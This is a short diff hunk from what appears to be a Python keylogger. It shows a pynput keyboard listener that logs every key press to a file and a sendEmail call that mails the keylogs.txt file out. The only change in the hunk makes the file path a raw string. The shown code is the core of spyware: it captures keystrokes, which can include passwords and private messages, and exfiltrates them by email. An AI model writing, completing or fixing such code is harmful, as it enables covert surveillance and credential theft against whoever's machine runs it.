@@ -47,4 +47,4 @@ def write_to_log(key):
 with Listener(on_press=write_to_log) as listener:
     listener.join()
 
-sendEmail("keylogs.txt", "path to kelogs.txt")
+sendEmail("keylogs.txt", r"path to kelogs.txt")
